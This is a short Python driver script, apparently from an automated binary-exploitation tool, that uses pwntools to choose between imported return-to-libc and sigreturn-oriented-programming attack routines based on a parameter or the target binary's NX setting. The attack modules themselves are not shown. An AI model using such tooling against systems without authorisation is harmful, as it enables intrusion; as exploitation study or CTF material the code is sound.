from pwn import *
import re
from verify_exploit import *
from parser import *
from utils import *
from dynamic_analyser import *
from ret2libc import *
from sigrop import *


libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6',checksec=True)

#Gets the parsed parameters
parameters = parser.getParameters()

#If the attack is a return-to-libc attack it invokes the ret2libc_attack function in module ret2libc
if parameters[3] == 'ret2libc':
    ret2libc_attack(parameters)

#If the attack is a sigrop attack it invokes the sigrop_attack function in module sigrop
if parameters[3] == 'sigrop':
    sigrop_attack(parameters)

#If the attack isn't specified, it checks whether NX is enabled
nx = ELF(f"{parameters[0]}").nx

if nx:
    ret2libc_attack(parameters)
else:
    sigrop_attack(parameters)